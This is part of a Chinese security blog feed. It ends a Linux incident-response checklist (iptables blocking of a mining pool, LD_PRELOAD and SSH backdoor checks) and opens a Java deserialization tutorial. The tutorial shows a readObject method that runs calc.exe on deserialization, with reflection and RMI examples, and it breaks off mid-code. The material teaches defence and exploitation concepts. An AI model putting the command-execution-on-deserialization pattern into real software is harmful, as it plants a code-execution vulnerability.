class="language-bash"><span class="token function">ps</span> -ef <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print&#125;'</span> <span class="token operator">|</span> <span class="token function">sort</span> -n <span class="token operator">|</span> <span class="token function">uniq</span> <span class="token operator">></span><span class="token number">1</span><span class="token function">ls</span> /proc <span class="token operator">|</span> <span class="token function">sort</span> -n <span class="token operator">|</span><span class="token function">uniq</span> <span class="token operator">></span><span class="token number">2</span><span class="token function">diff</span> <span class="token number">1</span> <span class="token number">2</span></code></pre><p>另外，针对挖矿命令被劫持的情况下可以使用perf top -s pid,comm,dso,symbol来看到挖矿进程</p><p>9 SEO文件搜索：<code>grep -ri baiduspider web_root_master</code></p><p>10 <code>netstat</code>被替换，可使用<code>ss</code>、<code>lsof</code>来替换</p><p>11 <code>arp -a</code>：查看arp记录是否正常</p><p>12 关注<code>Content-Length</code>值：<code>awk &#39;&#123;if($10&gt;5000000)&#123;print $0&#125;&#125;&#39; /var/log/httpd/access_log</code></p><p>13 查看动态库是否被修改</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token variable">$LD_PRELOAD</span>busybox <span class="token function">cat</span> /etc/ld.so.preload</code></pre><p>也可使用<code>strace</code>、<code>ldd</code>、<code>readefl</code>等命令</p><p>14 利用<code>iptables</code>阻断通讯</p><pre class="language-bash" data-language="bash"><code class="language-bash">iptables -A INPUT -s xmr.crypto-pool.fr -j DROPiptables -A OUTPUT -d xmr.crypto-pool.fr -j DROP</code></pre><p>15 文件监控<br>创建文件监控规则</p><pre class="language-bash" data-language="bash"><code class="language-bash">auditctl -w /etc/passwd -p war -k password_monitor</code></pre><p>监听日志</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">tail</span> -f /var/log/audit/audit.log<span class="token operator">|</span><span class="token function">grep</span> password_monitor</code></pre><p>16 网页挖矿多数都是加载conhive.min.js，script标签里有miner.start关键字，全局查找即可</p><p>17 检查SSH后门</p><ul><li>对比ssh版本：ssh -V</li><li>查看ssh配置文件和/usr/sbin/sshd的时间:stat /usr/sbin/sshd</li><li><code>strings</code>检查<code>/usr/sbin/sshd</code>，看是否有邮箱、IP等信息:<code>strings /usr/bin/.sshd | egrep &#39;[1-9]&#123;1,3&#125;.[1-9]&#123;1,3&#125;.&#39;</code></li><li>通过strace监控sshd进程读写文件的操作，一般的sshd后门都会将账户密码记录到文件，可以通过strace进程跟踪到ssh登录密码文件。</li></ul><p>18 清除僵尸进程<br>父进程调用fork创建子进程后，子进程运行直至其终止，它立即从内存中移除，但进程描述符仍然保留在内存中。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span> -e -o stat,ppid,pid,cmd <span class="token operator">|</span> <span class="token function">grep</span> -e <span class="token string">'^[Zz]'</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print <span class="token variable">$2</span>&#125;'</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">kill</span> -9</code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.anquanke.com/post/id/259764">应急响应入门篇-Linux分析排查技术（上）</a><br><a href="https://www.anquanke.com/post/id/260049">应急响应入门篇-Linux分析排查技术（上）</a></p>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
          <category> Linux篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅析Java反序列化</title>
      <link href="/posts/e47cc4e7/"/>
      <url>/posts/e47cc4e7/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211123154944.jpeg" loading="lazy"></p><p>文章首发先知社区——<a href="https://xz.aliyun.com/t/10508">https://xz.aliyun.com/t/10508</a></p><a id="more"></a><h2 id="0x00-引言"><a href="#0x00-引言" class="headerlink" title="0x00 引言"></a>0x00 引言</h2><p>打比赛遇到了，之前学习反序列化的内容时就一直计划着将Java反序列化进行学习总结一下，就是在学习过程中遇到的问题以及一些CTF案例进行总结和记录。</p><h2 id="0x01-Java反序列化基础"><a href="#0x01-Java反序列化基础" class="headerlink" title="0x01 Java反序列化基础"></a>0x01 Java反序列化基础</h2><p>由于学了Java的只是了解代码，并不了解基层的代码执行情况，也就是Java代码如何运行，只有一些浅显的理解。在学习反序列化漏洞前也是对这部分基础进行了多一点的了解。</p><h3 id="什么是JMX？"><a href="#什么是JMX？" class="headerlink" title="什么是JMX？"></a>什么是JMX？</h3><p>JMX(Java Management Extensions)，就是Java的管理扩展。用来管理和检测Java程序。<br>JMX简单架构<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211103144637.png" loading="lazy"><br>管理系统是通过JMX来管理系统中的各种资源的。<br>JMX有的应用架构有三层</p><blockquote><p>分布层(Distributed layer)包含使管理系统和JMX代理通信的组件<br>代理层(Agent layer)包括代理和Mbean服务器<br>指令层(Instrumentation layer)包括代表可管理资源的MBean<br>PS：MBean：符合JMX规范的Java类</p></blockquote><p>JMX通知是Java对象，通过它可以从<code>MBean</code>和代理向那些注册了接受通知的对象发送通知。对接受事件感兴趣的对象是通知监听器，是实现了<code>javax.management.NotificationListener</code>接口的类<br>JMX提供了两种机制来为MBean提供监听器以注册来接受通知：</p><ul><li>实现<code>javax.management.NotificationBroadcaster</code>接口</li><li>继承<code>javax.management.NotificationBroadcasterSupport</code>类</li></ul><h3 id="本地Java虚拟机如何运行远程的Java虚拟机的代码"><a href="#本地Java虚拟机如何运行远程的Java虚拟机的代码" class="headerlink" title="本地Java虚拟机如何运行远程的Java虚拟机的代码"></a>本地Java虚拟机如何运行远程的Java虚拟机的代码</h3><p>Java代码运行时需要有jre，C/C++代码运行是编写好代码后在程序内存中运行，而Java是在特定的Java虚拟机中运行，在虚拟机中运行的好处就是可以跨平台。只需要编译一次，即可在任何存在Java环境的系统中运行jar包。这也就是Java十分方便的一点。<br>在Java虚拟机中，运行过程如下<br>先将Java代码编译成字节码(class文件)，这是虚拟机能够识别的指令，再由虚拟机内部将字节码翻译成机器码，所以我们只需要有Java字节码，就可以在不同平台的虚拟机中运行。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211103152410.png" loading="lazy"><br>class文件被jdk所用的HotSpot虚拟机全部加载，将文件中的Java类放置在方法区，最后编译成机器码执行。</p><h3 id="Java反射"><a href="#Java反射" class="headerlink" title="Java反射"></a>Java反射</h3><p>反射：将类的属性和方法映射成相应的类。<br>获取class类的三种方法</p><ol><li>类名.class</li><li>对象名.getClass()</li><li>Class.forName(“需要加载的类名”)</li></ol><p>使用以上三种方法任意一个来获取特定的类的<code>class</code>类。即这个类对应的字节码</p><ul><li>调用<code>class</code>对象的<code>getConstructor(Class&lt;?&gt;... parameterTypes)</code>获取构造方法对象</li><li>调用构造方法类<code>Constructor</code>的<code>newInstance(Object.... initargs)</code>方法新建对象</li><li>调用<code>Class</code>对象的<code>getMethod(String name, Class&lt;?&gt;... parameterTypes)</code>获取方法对象<br>利用类对象创建对象<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>java<span class="token punctuation">.</span>ctf</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CreatObject</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span> <span class="token class-name">UserClass</span> <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"test.User"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> <span class="token class-name">UserClass</span><span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">User</span> user <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">User</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">"m0re"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><img src="https://gitee.com/m0re/picture/raw/master/img/20211105200256.png" loading="lazy"></li></ul><p>基础反射(数组的反射)</p><p>Java反射的主要组成部分有4个，分别是<code>Class</code>, <code>Field</code>, <code>Constructor</code>, <code>Method</code><br><img src="https://gitee.com/m0re/picture/raw/master/img/20211103185210.png" loading="lazy"></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>java<span class="token punctuation">.</span>ctf</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> game <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> a1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> a2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a1<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> a2<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//true</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a1<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//class [I</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a3<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//class [[I</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a1<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> a3<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//true</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a2<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//class java.lang.Object</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>可以看出，不同的维，<code>class</code>不同，但是父类都是<code>Object</code><br>一维数组不能直接转换成<code>Object[]</code></p><p>一个例子<br>如果使用Java代码来执行系统命令。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>java<span class="token punctuation">.</span>ctf</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> game <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"notepad.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>执行的命令是打开记事本。<br>如果使用的idea进行编写代码的话，会发现这里的提示<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211103154815.png" loading="lazy"><br>一般正常的流程应当是，先进行实例化对象，再调用<code>exec()</code>方法。执行系统命令。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Runtime</span> runtime <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>runtime<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"notepad.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这部分的相应的反射代码实际上为</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Object</span> runtime <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>runtime<span class="token punctuation">,</span> <span class="token string">"notepad.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>getMethod(“方法名”, 方法类型)<br>invoke(某个对象实例, 传入参数)</p><p>第一句获取<code>runtime</code>的实例，方便被<code>invoke</code>调用。<br>第二句就是调用第一句生成的<code>runtime</code>实例化后的<code>exec()</code>方法</p><h3 id="反序列化函数实例"><a href="#反序列化函数实例" class="headerlink" title="反序列化函数实例"></a>反序列化函数实例</h3><p>分别使用对象输入/输出流来实现序列化和反序列化操作<br>序列化：<code>ObjectOutputStream</code>类的<code>writeObject(Object obj)</code>方法，将对象序列化成字符串数据。<br>反序列化：<code>ObjectInputStream</code>类的<code>readObject(Object obj)</code>方法，将字符串数据反序列化长城对象。</p><blockquote><p>与php序列化等操作的原理类似。序列化的原理都为了实现数据的持久化，通过反序列化可以把数据永久的的保存在硬盘上。<br>利用序列化实现远程通信，即在网络上传递对象的字节序列。</p></blockquote><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// User.java</span><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>java<span class="token punctuation">.</span>ctf</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Serializable</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span><span class="token class-name">ObjectInputStream</span> stream<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        stream<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//game.java</span><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>java<span class="token punctuation">.</span>ctf</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> game <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">User</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        user<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"m0re"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">FileOutputStream</span> fout <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"user.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 打开user.bin作为文件</span>        <span class="token class-name">ObjectOutputStream</span> out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fout<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//打开一个文件输入流</span>        out<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//文件输入序列化数据</span>        out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">FileInputStream</span> fin <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"user.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectInputStream</span> in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fin<span class="token punctuation">)</span><span class="token punctuation">;</span>        in<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        in<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        fin<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>将User类中<code>Runtime.getRuntime().exec()</code>执行的弹出计算器的命令进行序列化，写入文件<code>user.bin</code>，然后在game.java中读取该文件并使用<code>readObject()</code>方法进行反序列化操作，执行了User中的系统命令，最终成功弹出计算器。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211103211427.png" loading="lazy"><br>然后看user.bin文件结构<br>标志是<code>aced0005</code>，经过base64转换之后是<code>rO0AB</code>，这个在后面应用的时候就可以看出来。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211105170728.png" loading="lazy"></p><h3 id="序列化版本号和serialVersionUID"><a href="#序列化版本号和serialVersionUID" class="headerlink" title="序列化版本号和serialVersionUID"></a>序列化版本号和serialVersionUID</h3><p>JVM通过类名来区分Java类，类名不同的话，就判断不是同一个类，当类名相同时，JVM就会通过序列化版本号来区分Java类，如果序列化版本号相同就是同一个类，不同则为不同的类。</p><blockquote><p>理解：在一个班级中，老师确定一个学生首先是根据学生的姓名来区分，当然无法避免重名的情况，如果重名，则进一步使用学号来区分，学号是唯一的。</p></blockquote><p>在序列化一个对象时，如果没有指定序列化版本号，后期对这个类的源码进行修改并重新编译，会导致修改前后的序列化版本号不一致，因为如果一个类一开始没有指定序列化版本号的话，后面JVM重新指定一版本号给这个类的对象。否则会报错，并抛出异常<code>java.io.InvalidClassException</code><br>解决办法：</p><ol><li>从一开始就指定好一个版本号给即将序列化的类。</li><li>如果忘了指定版本号，那么就永远不要修改这个类，不要重新编译。</li></ol><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BadAttributeValueExpException</span> <span class="token keyword">extends</span> <span class="token class-name">Exception</span>   <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">3105272988410493376L</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="RMI相关"><a href="#RMI相关" class="headerlink" title="RMI相关"></a>RMI相关</h3><p>RMI(Remote Method Invocation)是远程方法调用<br>JNDI(Java Naming and Directory Interface)，Java命名与目录接口<br>JNDI中包含许多RMI，类似于JNDI是图书馆的书架，书架上有很多分类的书。这些书就相当于RMI记录。<br><strong>实现一个RMI服务器</strong><br>定义好接口(interface)之后，继承了远程调式，</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>java<span class="token punctuation">.</span>ctf</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">Remote</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">User</span> <span class="token keyword">extends</span> <span class="token class-name">Remote</span><span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> <span class="token function">name</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">sex</span><span class="token punctuation">(</span><span class="token class-name">String</span> sex<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">nikename</span><span class="token punctuation">(</span><span class="token class-name">Object</span> secondname<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>java<span class="token punctuation">.</span>ctf</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">UnicastRemoteObject</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> game <span class="token keyword">extends</span> <span class="token class-name">UnicastRemoteObject</span> <span class="token keyword">implements</span> <span class="token class-name">User</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token function">game</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">&#123;</span>        <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">name</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">sex</span><span class="token punctuation">(</span><span class="token class-name">String</span> sex<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"you are a "</span><span class="token operator">+</span> sex<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">nikename</span><span class="token punctuation">(</span><span class="token class-name">Object</span> secondname<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"your second name is "</span><span class="token operator">+</span> secondname<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>java<span class="token punctuation">.</span>ctf</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">Naming</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Server</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> url <span class="token operator">=</span> <span class="token 